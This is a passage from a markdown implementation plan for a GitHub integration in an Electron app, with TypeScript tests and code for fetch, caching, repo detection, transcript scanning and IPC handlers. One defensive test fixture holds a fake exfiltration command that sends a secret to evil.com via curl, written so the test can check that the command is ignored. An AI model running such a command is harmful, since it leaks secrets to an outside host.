    } catch {
      /* ignore */
    }
    await this.pruneCorruptBackups()
  }

  private async pruneCorruptBackups(): Promise<void> {
    const entries = await fs.readdir(this.dir)
    const backups = entries
      .filter((e) => e.startsWith('github-cache.corrupt-') && e.endsWith('.json'))
      .sort() // lexicographic matches numeric timestamp order
    const excess = backups.length - CACHE_CORRUPT_BACKUPS_KEEP
    for (let i = 0; i < excess; i++) {
      await fs.unlink(path.join(this.dir, backups[i])).catch(() => {})
    }
  }
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/cache-store.test.ts`
Expected: 5 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/cache/cache-store.ts tests/unit/github/cache-store.test.ts
git commit -m "feat(github): CacheStore with LRU eviction + corrupt backup retention"
```

---

### Task F4: GitHub authenticated fetch wrapper

**Files:** Create `src/main/github/client/github-fetch.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/github-fetch.test.ts
import { describe, it, expect, vi, afterEach } from 'vitest'
import { githubFetch } from '../../../src/main/github/client/github-fetch'
import { RateLimitShield } from '../../../src/main/github/client/rate-limit-shield'
import { EtagCache } from '../../../src/main/github/client/etag-cache'

const originalFetch = globalThis.fetch
afterEach(() => { globalThis.fetch = originalFetch })

function fakeResp(body: any, headers: Record<string, string> = {}, status = 200) {
  return {
    ok: status >= 200 && status < 300,
    status,
    headers: { get: (h: string) => headers[h.toLowerCase()] ?? null },
    json: async () => body,
    text: async () => JSON.stringify(body),
  }
}

describe('githubFetch', () => {
  const shield = new RateLimitShield()
  const etags = new EtagCache({})
  const tokenFn = async () => 'ghp_FAKE'

  it('sends Authorization header', async () => {
    globalThis.fetch = vi.fn(async (_url, opts) => {
      expect((opts as any).headers.Authorization).toBe('token ghp_FAKE')
      return fakeResp({ ok: true }, {
        'x-ratelimit-limit': '5000',
        'x-ratelimit-remaining': '4999',
        'x-ratelimit-reset': String(Math.floor(Date.now() / 1000) + 3600),
      })
    }) as any
    await githubFetch('/user', { tokenFn, shield, etags })
  })

  it('sends If-None-Match when etag cached', async () => {
    etags.set('GET /user', '"etag1"')
    globalThis.fetch = vi.fn(async (_url, opts) => {
      expect((opts as any).headers['If-None-Match']).toBe('"etag1"')
      return fakeResp({}, {}, 304)
    }) as any
    const r = await githubFetch('/user', { tokenFn, shield, etags })
    expect(r.status).toBe(304)
  })

  it('captures new etag from response', async () => {
    globalThis.fetch = vi.fn(async () =>
      fakeResp({ ok: 1 }, { etag: '"new-etag"' }),
    ) as any
    await githubFetch('/repos/a/b', { tokenFn, shield, etags })
    expect(etags.get('GET /repos/a/b')).toBe('"new-etag"')
  })

  it('throws rate-limited error when shield blocks', async () => {
    const blockedShield = new RateLimitShield()
    blockedShield.update('core', { limit: 5000, remaining: 0, resetAt: Date.now() + 60_000, capturedAt: Date.now() })
    globalThis.fetch = vi.fn() as any
    await expect(githubFetch('/x', { tokenFn, shield: blockedShield, etags: new EtagCache({}) }))
      .rejects.toThrow(/rate.limit/i)
    expect(globalThis.fetch).not.toHaveBeenCalled()
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/github-fetch.test.ts`
Expected: FAIL.

- [ ] **Step 3: Implementation**

```ts
// src/main/github/client/github-fetch.ts
import { GITHUB_API_BASE } from '../../../shared/github-constants'
import { EtagCache } from './etag-cache'
import { RateLimitShield, type Bucket } from './rate-limit-shield'

export interface GithubFetchOptions {
  tokenFn: () => Promise<string>
  shield: RateLimitShield
  etags: EtagCache
  bucket?: Bucket
  method?: 'GET' | 'POST' | 'PATCH' | 'PUT' | 'DELETE'
  body?: any
  baseUrl?: string
}

export class RateLimitError extends Error {
  constructor(public resetAt: number) {
    super('rate-limited')
  }
}

export async function githubFetch(
  pathOrUrl: string,
  opts: GithubFetchOptions,
): Promise<Response> {
  const bucket: Bucket = opts.bucket ?? 'core'
  const now = Date.now()
  if (!opts.shield.canCall(bucket, now)) {
    throw new RateLimitError(opts.shield.nextAllowedAt(bucket) ?? now + 60_000)
  }

  const url = pathOrUrl.startsWith('http')
    ? pathOrUrl
    : (opts.baseUrl ?? GITHUB_API_BASE) + pathOrUrl
  const method = opts.method ?? 'GET'
  const key = `${method} ${pathOrUrl}`
  const token = await opts.tokenFn()
  const headers: Record<string, string> = {
    Authorization: `token ${token}`,
    Accept: 'application/vnd.github+json',
    'User-Agent': 'ClaudeCommandCenter',
  }
  if (method === 'GET') {
    const etag = opts.etags.get(key)
    if (etag) headers['If-None-Match'] = etag
  }
  if (opts.body !== undefined) {
    headers['Content-Type'] = 'application/json'
  }

  const resp = await fetch(url, {
    method,
    headers,
    body: opts.body !== undefined ? JSON.stringify(opts.body) : undefined,
  })

  // Update rate limit from headers
  const limit = Number(resp.headers.get('x-ratelimit-limit'))
  const remaining = Number(resp.headers.get('x-ratelimit-remaining'))
  const reset = Number(resp.headers.get('x-ratelimit-reset'))
  if (limit && !Number.isNaN(remaining) && reset) {
    opts.shield.update(bucket, {
      limit,
      remaining,
      resetAt: reset * 1000,
      capturedAt: Date.now(),
    })
  }

  // Capture ETag for 200s
  if (resp.status === 200) {
    const etag = resp.headers.get('etag')
    if (etag) opts.etags.set(key, etag)
  }

  return resp
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/github-fetch.test.ts`
Expected: 4 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/client/github-fetch.ts tests/unit/github/github-fetch.test.ts
git commit -m "feat(github): authenticated fetch wrapper with ETag + rate-limit shield"
```

---

### Task F5: GraphQL query for PR card + REST fallback

**Files:** Create `src/main/github/client/graphql-queries.ts`, `src/main/github/client/rest-fallback.ts`.

- [ ] **Step 1: Create graphql-queries.ts**

```ts
// src/main/github/client/graphql-queries.ts
export const PR_CARD_QUERY = /* GraphQL */ `
  query PRCard($owner: String!, $name: String!, $branch: String!) {
    repository(owner: $owner, name: $name) {
      mergeCommitAllowed
      squashMergeAllowed
      rebaseMergeAllowed
      pullRequests(headRefName: $branch, states: [OPEN], first: 1) {
        nodes {
          number title body state isDraft createdAt updatedAt
          author { login avatarUrl }
          mergeable
          reviewDecision
          reviews(last: 30) {
            nodes {
              id state author { login avatarUrl }
              comments(last: 20) { nodes { id body path position originalPosition author { login } } }
            }
          }
          commits(last: 1) {
            nodes {
              commit {
                statusCheckRollup { state contexts(last: 50) { nodes {
                  __typename
                  ... on CheckRun { name conclusion status detailsUrl }
                  ... on StatusContext { context state description targetUrl }
                } } }
              }
            }
          }
          closingIssuesReferences(first: 20) { nodes { number title state } }
        }
      }
    }
  }
`

export interface PrCardVars {
  owner: string
  name: string
  branch: string
}
```

- [ ] **Step 2: Create rest-fallback.ts**

```ts
// src/main/github/client/rest-fallback.ts
import { githubFetch, type GithubFetchOptions } from './github-fetch'

export async function fetchPRByBranch(
  slug: string,
  branch: string,
  opts: Pick<GithubFetchOptions, 'tokenFn' | 'shield' | 'etags'>,
): Promise<any | null> {
  const r = await githubFetch(
    `/repos/${slug}/pulls?head=${encodeURIComponent(slug.split('/')[0] + ':' + branch)}&state=open`,
    opts,
  )
  if (r.status === 304) return null
  if (!r.ok) return null
  const arr = (await r.json()) as any[]
  return arr[0] ?? null
}

export async function fetchWorkflowRuns(
  slug: string,
  branch: string,
  opts: Pick<GithubFetchOptions, 'tokenFn' | 'shield' | 'etags'>,
): Promise<any[]> {
  const r = await githubFetch(
    `/repos/${slug}/actions/runs?branch=${encodeURIComponent(branch)}&per_page=10`,
    opts,
  )
  if (!r.ok) return []
  const body = (await r.json()) as { workflow_runs?: any[] }
  return body.workflow_runs ?? []
}

export async function fetchPRReviews(
  slug: string,
  prNumber: number,
  opts: Pick<GithubFetchOptions, 'tokenFn' | 'shield' | 'etags'>,
): Promise<any[]> {
  const r = await githubFetch(`/repos/${slug}/pulls/${prNumber}/reviews`, opts)
  if (!r.ok) return []
  return (await r.json()) as any[]
}

export async function fetchPRComments(
  slug: string,
  prNumber: number,
  opts: Pick<GithubFetchOptions, 'tokenFn' | 'shield' | 'etags'>,
): Promise<any[]> {
  const r = await githubFetch(`/repos/${slug}/pulls/${prNumber}/comments`, opts)
  if (!r.ok) return []
  return (await r.json()) as any[]
}
```

- [ ] **Step 3: Typecheck**

Run: `npm run typecheck`
Expected: no errors.

- [ ] **Step 4: Commit**

```bash
git add src/main/github/client/graphql-queries.ts src/main/github/client/rest-fallback.ts
git commit -m "feat(github): GraphQL PR card query + REST fallback endpoints"
```

---

## Phase G — Session Integration

### Task G1: Repo detector (local git)

**Files:** Create `src/main/github/session/repo-detector.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/repo-detector.test.ts
import { describe, it, expect, vi } from 'vitest'
import { detectRepoFromCwd } from '../../../src/main/github/session/repo-detector'

describe('detectRepoFromCwd', () => {
  it('returns parsed slug from git remote', async () => {
    const run = vi.fn().mockResolvedValue('https://github.com/nubbymong/claude-command-center.git\n')
    expect(await detectRepoFromCwd('/tmp/x', run)).toBe('nubbymong/claude-command-center')
  })
  it('returns null when not a git repo', async () => {
    const run = vi.fn().mockRejectedValue(new Error('not a git repo'))
    expect(await detectRepoFromCwd('/tmp/x', run)).toBeNull()
  })
  it('returns null when remote is not github', async () => {
    const run = vi.fn().mockResolvedValue('https://gitlab.com/a/b.git\n')
    expect(await detectRepoFromCwd('/tmp/x', run)).toBeNull()
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/repo-detector.test.ts`
Expected: FAIL.

- [ ] **Step 3: Implementation**

```ts
// src/main/github/session/repo-detector.ts
import { spawn } from 'node:child_process'
import { parseRepoUrl } from '../security/repo-url-parser'

export type RunGit = (cwd: string, args: string[]) => Promise<string>

export async function detectRepoFromCwd(cwd: string, run: RunGit): Promise<string | null> {
  try {
    const out = await run(cwd, ['remote', 'get-url', 'origin'])
    return parseRepoUrl(out)
  } catch {
    return null
  }
}

export function defaultGitRun(): RunGit {
  return (cwd, args) =>
    new Promise<string>((resolve, reject) => {
      const proc = spawn('git', args, { cwd, stdio: ['ignore', 'pipe', 'pipe'] })
      let stdout = ''
      let stderr = ''
      proc.stdout.on('data', (c) => (stdout += c.toString()))
      proc.stderr.on('data', (c) => (stderr += c.toString()))
      proc.on('error', reject)
      proc.on('close', (code) => {
        if (code !== 0) reject(new Error(stderr || `git exited ${code}`))
        else resolve(stdout)
      })
    })
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/repo-detector.test.ts`
Expected: 3 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/session/repo-detector.ts tests/unit/github/repo-detector.test.ts
git commit -m "feat(github): repo detector via git remote get-url origin"
```

---

### Task G2: Tool-call inspector (narrow allowlist)

**Files:** Create `src/main/github/session/tool-call-inspector.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/tool-call-inspector.test.ts
import { describe, it, expect } from 'vitest'
import { extractFileSignals } from '../../../src/main/github/session/tool-call-inspector'

describe('extractFileSignals', () => {
  it('captures file_path from Edit tool call', () => {
    const events = [
      { type: 'tool_call', tool: 'Edit', args: { file_path: 'src/auth/login.ts', old_string: 'SECRET', new_string: 'XX' }, timestamp: 1000 },
    ]
    const sigs = extractFileSignals(events as any)
    expect(sigs).toHaveLength(1)
    expect(sigs[0].filePath).toBe('src/auth/login.ts')
    expect(sigs[0].tool).toBe('Edit')
  })

  it('does NOT capture old_string or new_string', () => {
    const events = [
      { type: 'tool_call', tool: 'Edit', args: { file_path: 'x.ts', old_string: 'SECRET_TOKEN', new_string: 'other' }, timestamp: 1 },
    ]
    const sigs = extractFileSignals(events as any)
    expect(JSON.stringify(sigs)).not.toContain('SECRET_TOKEN')
    expect(JSON.stringify(sigs)).not.toContain('other')
  })

  it('Bash: captures only first-token command category and path args from allowlisted commands', () => {
    const events = [
      { type: 'tool_call', tool: 'Bash', args: { command: 'git status' }, timestamp: 1 },
      { type: 'tool_call', tool: 'Bash', args: { command: 'cat src/shared/types.ts' }, timestamp: 2 },
      { type: 'tool_call', tool: 'Bash', args: { command: 'curl https://evil.com/exfil?data=SECRET' }, timestamp: 3 },
    ]
    const sigs = extractFileSignals(events as any)
    // First: git — categorized but no file path arg
    // Second: cat with a path — captured
    // Third: curl — not in allowlist, nothing captured
    expect(sigs.some((s) => s.filePath === 'src/shared/types.ts')).toBe(true)
    expect(JSON.stringify(sigs)).not.toContain('evil.com')
    expect(JSON.stringify(sigs)).not.toContain('SECRET')
  })

  it('caps at 20 distinct most-recent files', () => {
    const events = Array.from({ length: 30 }, (_, i) => ({
      type: 'tool_call',
      tool: 'Read',
      args: { file_path: `f${i}.ts` },
      timestamp: 100 + i,
    }))
    const sigs = extractFileSignals(events as any)
    expect(sigs.length).toBeLessThanOrEqual(20)
    // Most recent should win
    expect(sigs.some((s) => s.filePath === 'f29.ts')).toBe(true)
  })

  it('ignores tool_call types not in allowlist', () => {
    const events = [
      { type: 'tool_call', tool: 'WebFetch', args: { url: 'https://example.com' }, timestamp: 1 },
      { type: 'tool_call', tool: 'TodoWrite', args: { items: [] }, timestamp: 2 },
    ]
    expect(extractFileSignals(events as any)).toEqual([])
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/tool-call-inspector.test.ts`
Expected: FAIL.

- [ ] **Step 3: Implementation**

```ts
// src/main/github/session/tool-call-inspector.ts
import type { ToolCallFileSignal } from '../../../shared/github-types'

export interface TranscriptToolCall {
  type: 'tool_call'
  tool: string
  args: Record<string, any>
  timestamp: number
}

const FILE_TOOLS = new Set(['Read', 'Write', 'Edit', 'NotebookEdit', 'MultiEdit'])
const BASH_PATH_ALLOWLIST = new Set(['git', 'gh', 'cat', 'rm', 'mv', 'cp', 'ls', 'mkdir'])
const PATH_ARG_REGEX = /^(?:\/|~|\.\/|\.\.\/|[A-Za-z]:|\w+\/)/

const MAX_FILES = 20
const MAX_LOOKBACK_EVENTS = 100
const MAX_LOOKBACK_MS = 30 * 60 * 1000

export function extractFileSignals(events: TranscriptToolCall[]): ToolCallFileSignal[] {
  const now = Date.now()
  const cutoff = now - MAX_LOOKBACK_MS
  const sliced = events.slice(-MAX_LOOKBACK_EVENTS).filter((e) => e.timestamp >= cutoff)

  const signals: ToolCallFileSignal[] = []
  for (const e of sliced) {
    if (e.type !== 'tool_call') continue

    if (FILE_TOOLS.has(e.tool)) {
      const fp = typeof e.args?.file_path === 'string' ? e.args.file_path : null
      if (fp) {
        signals.push({
          filePath: fp,
          at: e.timestamp,
          tool: e.tool as ToolCallFileSignal['tool'],
        })
      }
      continue
    }

    if (e.tool === 'Bash') {
      const cmd = typeof e.args?.command === 'string' ? e.args.command : ''
      const tokens = cmd.trim().split(/\s+/)
      const first = tokens[0] ?? ''
      if (!BASH_PATH_ALLOWLIST.has(first)) continue
      for (const tok of tokens.slice(1)) {
        if (PATH_ARG_REGEX.test(tok)) {
          signals.push({ filePath: tok, at: e.timestamp, tool: 'Bash' })
        }
      }
    }
  }

  // Dedupe by filePath, newest wins
  const latestByPath = new Map<string, ToolCallFileSignal>()
  for (const s of signals) {
    const prev = latestByPath.get(s.filePath)
    if (!prev || s.at > prev.at) latestByPath.set(s.filePath, s)
  }
  const unique = Array.from(latestByPath.values()).sort((a, b) => b.at - a.at)
  return unique.slice(0, MAX_FILES)
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/tool-call-inspector.test.ts`
Expected: 5 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/session/tool-call-inspector.ts tests/unit/github/tool-call-inspector.test.ts
git commit -m "feat(github): tool-call inspector with narrow field allowlist"
```

---

### Task G3: Transcript scanner (opt-in)

**Files:** Create `src/main/github/session/transcript-scanner.ts`, test.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/transcript-scanner.test.ts
import { describe, it, expect } from 'vitest'
import { scanTranscriptMessages } from '../../../src/main/github/session/transcript-scanner'

describe('scanTranscriptMessages', () => {
  it('extracts #NNN references from messages', () => {
    const msgs = [
      { role: 'user', text: 'Fix the #247 login bug', ts: 100 },
      { role: 'assistant', text: 'See also GH-248', ts: 200 },
    ]
    const refs = scanTranscriptMessages(msgs as any)
    expect(refs.map((r) => r.number)).toEqual([247, 248])
  })

  it('extracts full github.com URLs', () => {
    const msgs = [
      { role: 'user', text: 'Check https://github.com/a/b/pull/12', ts: 1 },
    ]
    const refs = scanTranscriptMessages(msgs as any)
    expect(refs[0]).toMatchObject({ kind: 'pr', repo: 'a/b', number: 12 })
  })

  it('only reads last 50 messages', () => {
    const msgs = Array.from({ length: 100 }, (_, i) => ({
      role: 'user' as const, text: `#${i}`, ts: i,
    }))
    const refs = scanTranscriptMessages(msgs as any)
    expect(refs.every((r) => r.number >= 50)).toBe(true)
  })

  it('ignores tool_call events', () => {
    const msgs = [
      { role: 'tool_call', text: '#999 in tool', ts: 1 } as any,
    ]
    expect(scanTranscriptMessages(msgs)).toEqual([])
  })
})
```

- [ ] **Step 2: Run — expect fail**

Run: `npx vitest run tests/unit/github/transcript-scanner.test.ts`
Expected: FAIL.

- [ ] **Step 3: Implementation**

```ts
// src/main/github/session/transcript-scanner.ts
import type { TranscriptReference } from '../../../shared/github-types'
import {
  TRANSCRIPT_ISSUE_REGEX,
  TRANSCRIPT_GH_REGEX,
  TRANSCRIPT_URL_REGEX,
} from '../../../shared/github-constants'

export interface TranscriptMessage {
  role: 'user' | 'assistant'
  text: string
  ts: number
}

const MAX_MESSAGES = 50

export function scanTranscriptMessages(
  messages: TranscriptMessage[],
): TranscriptReference[] {
  const recent = messages
    .filter((m) => m.role === 'user' || m.role === 'assistant')
    .slice(-MAX_MESSAGES)

  const refs: TranscriptReference[] = []
  for (const m of recent) {
    if (typeof m.text !== 'string') continue
    for (const match of m.text.matchAll(TRANSCRIPT_ISSUE_REGEX)) {
      refs.push({ kind: 'issue', number: Number(match[1]), at: m.ts })
    }
    for (const match of m.text.matchAll(TRANSCRIPT_GH_REGEX)) {
      refs.push({ kind: 'issue', number: Number(match[1]), at: m.ts })
    }
    for (const match of m.text.matchAll(TRANSCRIPT_URL_REGEX)) {
      const url = match[0]
      const kind = url.includes('/pull/') ? 'pr' : 'issue'
      refs.push({
        kind,
        repo: `${match[1]}/${match[2]}`,
        number: Number(match[3]),
        at: m.ts,
      })
    }
  }
  return refs
}
```

- [ ] **Step 4: Run — expect pass**

Run: `npx vitest run tests/unit/github/transcript-scanner.test.ts`
Expected: 4 tests pass.

- [ ] **Step 5: Commit**

```bash
git add src/main/github/session/transcript-scanner.ts tests/unit/github/transcript-scanner.test.ts
git commit -m "feat(github): opt-in transcript scanner for #NNN / PR URLs"
```

---

## Phase H — IPC Handlers, Preload, Renderer Types

### Task H1: GitHub IPC handlers — register all channels

**Files:** Create `src/main/ipc/github-handlers.ts`, modify `src/main/index.ts`.

- [ ] **Step 1: Create handler skeleton**

```ts
// src/main/ipc/github-handlers.ts
import { ipcMain, BrowserWindow, shell } from 'electron'
import {
  GITHUB_CONFIG_GET,
  GITHUB_CONFIG_UPDATE,
  GITHUB_PROFILE_ADD_PAT,
  GITHUB_PROFILE_REMOVE,
  GITHUB_PROFILE_RENAME,
  GITHUB_PROFILE_TEST,
  GITHUB_OAUTH_START,
  GITHUB_OAUTH_POLL,
  GITHUB_OAUTH_CANCEL,
  GITHUB_GHCLI_DETECT,
  GITHUB_REPO_DETECT,
  GITHUB_SESSION_CONFIG_UPDATE,
  GITHUB_SYNC_NOW,
  GITHUB_SYNC_PAUSE,
  GITHUB_SYNC_RESUME,
  GITHUB_DATA_GET,
  GITHUB_DATA_UPDATE,
  GITHUB_SESSION_CONTEXT_GET,
  GITHUB_ACTIONS_RERUN,
  GITHUB_PR_MERGE,
  GITHUB_PR_READY,
  GITHUB_REVIEW_REPLY,
  GITHUB_NOTIF_MARK_READ,
} from '../../shared/ipc-channels'
import { GitHubConfigStore } from '../github/github-config-store'
import { AuthProfileStore } from '../github/auth/auth-profile-store'
import { ghAuthStatus, ghAuthToken, defaultGhRun } from '../github/auth/gh-cli-delegate'
import { requestDeviceCode, pollForAccessToken } from '../github/auth/oauth-device-flow'
import { verifyToken, probeRepoAccess } from '../github/auth/pat-verifier'
import { scopesToCapabilities } from '../github/auth/capability-mapper'
import { detectRepoFromCwd, defaultGitRun } from '../github/session/repo-detector'
import { validateSlug } from '../github/security/slug-validator'

let configStore: GitHubConfigStore
let profileStore: AuthProfileStore
let getWindow: () => BrowserWindow | null = () => null

// Active OAuth flows keyed by flow id
const activeFlows = new Map<string, { deviceCode: string; cancelled: boolean }>()

export function registerGitHubHandlers(
  resourcesDir: string,
  windowGetter: () => BrowserWindow | null,
) {
  getWindow = windowGetter
  configStore = new GitHubConfigStore(resourcesDir)
  profileStore = new AuthProfileStore({
    readConfig: () => configStore.read(),
    writeConfig: (c) => configStore.write(c),
  })

  ipcMain.handle(GITHUB_CONFIG_GET, async () => {
    return (await configStore.read()) ?? null
  })

  ipcMain.handle(GITHUB_CONFIG_UPDATE, async (_e, patch: any) => {
    const cur = (await configStore.read()) ?? {
      schemaVersion: 1,
      authProfiles: {},
      featureToggles: {},
      syncIntervals: { activeSessionSec: 60, backgroundSec: 300, notificationsSec: 180 },
      enabledByDefault: false,
      transcriptScanningOptIn: false,
    }
    const updated = { ...cur, ...patch }
    await configStore.write(updated)
    return updated
  })

  ipcMain.handle(GITHUB_PROFILE_ADD_PAT, async (_e, input: {
    kind: 'pat-classic' | 'pat-fine-grained'
    label: string
    rawToken: string
    allowedRepos?: string[]
  }) => {
    const v = await verifyToken(input.rawToken)
    if (!v) return { ok: false, error: 'Invalid token' }
    const caps = scopesToCapabilities(
      input.kind === 'pat-fine-grained' ? 'fine-grained' : 'classic',
      v.scopes,
    )

    // For fine-grained, probe allowedRepos if provided
    let finalAllowed: string[] | undefined
    if (input.kind === 'pat-fine-grained' && input.allowedRepos) {
      finalAllowed = []
      for (const slug of input.allowedRepos) {
        if (!validateSlug(slug)) continue
        if (await probeRepoAccess(input.rawToken, slug)) finalAllowed.push(slug)
      }
    }

    const id = await profileStore.addProfile({
      kind: input.kind,
      label: input.label,
      username: v.username,
      avatarUrl: v.avatarUrl,
      scopes: v.scopes,
      capabilities: caps,
      allowedRepos: finalAllowed,
      rawToken: input.rawToken,
      expiresAt: v.expiresAt,
      expiryObservable: !!v.expiresAt,
    })
    return { ok: true, id }
  })

  ipcMain.handle(GITHUB_PROFILE_REMOVE, async (_e, id: string) => {
    await profileStore.removeProfile(id)
    return { ok: true }
  })

  ipcMain.handle(GITHUB_PROFILE_RENAME, async (_e, id: string, label: string) => {
    await profileStore.updateProfile(id, { label })
    return { ok: true }
  })

  ipcMain.handle(GITHUB_PROFILE_TEST, async (_e, id: string) => {
    const token = await profileStore.getToken(id)
    if (!token) return { ok: false, error: 'no-token' }
    const r = await verifyToken(token)
    return r ? { ok: true, ...r } : { ok: false, error: 'invalid' }
  })

  ipcMain.handle(GITHUB_OAUTH_START, async (_e, mode: 'public' | 'private') => {
    const scope = mode === 'private'
      ? 'repo read:org notifications workflow'
      : 'public_repo read:org notifications workflow'
    const resp = await requestDeviceCode(scope)
    const flowId = resp.device_code
    activeFlows.set(flowId, { deviceCode: resp.device_code, cancelled: false })
    return {
      flowId,
      userCode: resp.user_code,
      verificationUri: resp.verification_uri,
      expiresIn: resp.expires_in,
      interval: resp.interval,
    }
  })

  ipcMain.handle(GITHUB_OAUTH_POLL, async (_e, flowId: string) => {
    const flow = activeFlows.get(flowId)
    if (!flow) return { ok: false, error: 'not-found' }
    if (flow.cancelled) return { ok: false, error: 'cancelled' }
    try {
      const r = await pollForAccessToken(flow.deviceCode, 5)
      if (r.access_token) {
        // Verify + add profile
        const v = await verifyToken(r.access_token)
        if (!v) return { ok: false, error: 'verify-failed' }
        const caps = scopesToCapabilities('oauth', v.scopes)
        const id = await profileStore.addProfile({
          kind: 'oauth',
          label: v.username,
          username: v.username,
          avatarUrl: v.avatarUrl,
          scopes: v.scopes,
          capabilities: caps,
          rawToken: r.access_token,
          expiryObservable: false,  // OAuth tokens have no visible expiry
        })
        activeFlows.delete(flowId)
        return { ok: true, profileId: id }
      }
      return { ok: false, error: 'pending' }
    } catch (e) {
      return { ok: false, error: String(e) }
    }
  })

  ipcMain.handle(GITHUB_OAUTH_CANCEL, async (_e, flowId: string) => {
    const flow = activeFlows.get(flowId)
    if (flow) flow.cancelled = true
    activeFlows.delete(flowId)
    return { ok: true }
  })

  ipcMain.handle(GITHUB_GHCLI_DETECT, async () => {
    const users = await ghAuthStatus(defaultGhRun())
    return { ok: true, users }
  })

  ipcMain.handle(GITHUB_REPO_DETECT, async (_e, cwd: string) => {
    const slug = await detectRepoFromCwd(cwd, defaultGitRun())
    return { ok: true, slug }
  })

  // Stubs for session config update, sync control, data fetch — wire in Phase F continuation
  ipcMain.handle(GITHUB_SESSION_CONFIG_UPDATE, async () => ({ ok: true }))
  ipcMain.handle(GITHUB_SYNC_NOW, async () => ({ ok: true }))
  ipcMain.handle(GITHUB_SYNC_PAUSE, async () => ({ ok: true }))
  ipcMain.handle(GITHUB_SYNC_RESUME, async () => ({ ok: true }))
  ipcMain.handle(GITHUB_DATA_GET, async () => ({ ok: true, data: null }))
  ipcMain.handle(GITHUB_SESSION_CONTEXT_GET, async () => ({ ok: true, data: null }))
  ipcMain.handle(GITHUB_ACTIONS_RERUN, async () => ({ ok: true }))
  ipcMain.handle(GITHUB_PR_MERGE, async () => ({ ok: true }))
  ipcMain.handle(GITHUB_PR_READY, async () => ({ ok: true }))
  ipcMain.handle(GITHUB_REVIEW_REPLY, async () => ({ ok: true }))
  ipcMain.handle(GITHUB_NOTIF_MARK_READ, async () => ({ ok: true }))
}
```

- [ ] **Step 2: Register in main/index.ts**

Find the block where other handlers are registered (`registerTokenomicsHandlers`, etc.) and add:

```ts
import { registerGitHubHandlers } from './ipc/github-handlers'

// ...inside app init after resourcesDir is resolved:
registerGitHubHandlers(resourcesDir, () => getWindow())
```

- [ ] **Step 3: Typecheck + build**

```bash
npm run typecheck
npm run build
```

Expected: clean.

- [ ] **Step 4: Commit**

```bash
git add src/main/ipc/github-handlers.ts src/main/index.ts
git commit -m "feat(github): register IPC handlers for auth + config + OAuth device flow"
```

---

### Task H2: Preload bridge + electron.d.ts

**Files:** `src/preload/index.ts` (modify), `src/renderer/types/electron.d.ts` (modify).

- [ ] **Step 1: Extend preload**

Add inside the existing `contextBridge.exposeInMainWorld('electron', { ... })` call:

```ts
github: {
  getConfig: () => ipcRenderer.invoke(GITHUB_CONFIG_GET),
  updateConfig: (patch: any) => ipcRenderer.invoke(GITHUB_CONFIG_UPDATE, patch),
  addPat: (input: any) => ipcRenderer.invoke(GITHUB_PROFILE_ADD_PAT, input),
  removeProfile: (id: string) => ipcRenderer.invoke(GITHUB_PROFILE_REMOVE, id),
  renameProfile: (id: string, label: string) => ipcRenderer.invoke(GITHUB_PROFILE_RENAME, id, label),
  testProfile: (id: string) => ipcRenderer.invoke(GITHUB_PROFILE_TEST, id),
  oauthStart: (mode: 'public' | 'private') => ipcRenderer.invoke(GITHUB_OAUTH_START, mode),
  oauthPoll: (flowId: string) => ipcRenderer.invoke(GITHUB_OAUTH_POLL, flowId),
  oauthCancel: (flowId: string) => ipcRenderer.invoke(GITHUB_OAUTH_CANCEL, flowId),
  ghcliDetect: () => ipcRenderer.invoke(GITHUB_GHCLI_DETECT),
  repoDetect: (cwd: string) => ipcRenderer.invoke(GITHUB_REPO_DETECT, cwd),
  updateSessionConfig: (sessionId: string, patch: any) =>
    ipcRenderer.invoke(GITHUB_SESSION_CONFIG_UPDATE, sessionId, patch),
  syncNow: (sessionId: string) => ipcRenderer.invoke(GITHUB_SYNC_NOW, sessionId),
  syncPause: () => ipcRenderer.invoke(GITHUB_SYNC_PAUSE),
  syncResume: () => ipcRenderer.invoke(GITHUB_SYNC_RESUME),
  getData: (slug: string) => ipcRenderer.invoke(GITHUB_DATA_GET, slug),
  getSessionContext: (sessionId: string) => ipcRenderer.invoke(GITHUB_SESSION_CONTEXT_GET, sessionId),
  onDataUpdate: (cb: (payload: any) => void) => {
    const listener = (_e: any, payload: any) => cb(payload)
    ipcRenderer.on(GITHUB_DATA_UPDATE, listener)
    return () => ipcRenderer.removeListener(GITHUB_DATA_UPDATE, listener)
  },
  rerunActionsRun: (slug: string, runId: number) =>
    ipcRenderer.invoke(GITHUB_ACTIONS_RERUN, slug, runId),
  mergePR: (slug: string, prNumber: number, method: 'merge' | 'squash' | 'rebase') =>
    ipcRenderer.invoke(GITHUB_PR_MERGE, slug, prNumber, method),
  readyPR: (slug: string, prNumber: number) =>
    ipcRenderer.invoke(GITHUB_PR_READY, slug, prNumber),
  replyToReview: (slug: string, threadId: string, body: string) =>
    ipcRenderer.invoke(GITHUB_REVIEW_REPLY, slug, threadId, body),
  markNotifRead: (profileId: string, notifId: string) =>
    ipcRenderer.invoke(GITHUB_NOTIF_MARK_READ, profileId, notifId),
},
```

(Import the IPC channel constants at the top of the file too.)

- [ ] **Step 2: Add types to electron.d.ts**

Append inside the `window.electron` interface:

```ts
github: {
  getConfig: () => Promise<import('../../shared/github-types').GitHubConfig | null>
  updateConfig: (patch: Partial<import('../../shared/github-types').GitHubConfig>) => Promise<import('../../shared/github-types').GitHubConfig>
  addPat: (input: { kind: 'pat-classic' | 'pat-fine-grained'; label: string; rawToken: string; allowedRepos?: string[] }) => Promise<{ ok: boolean; id?: string; error?: string }>
  removeProfile: (id: string) => Promise<{ ok: boolean }>
  renameProfile: (id: string, label: string) => Promise<{ ok: boolean }>
  testProfile: (id: string) => Promise<{ ok: boolean; username?: string; scopes?: string[]; expiresAt?: number; error?: string }>
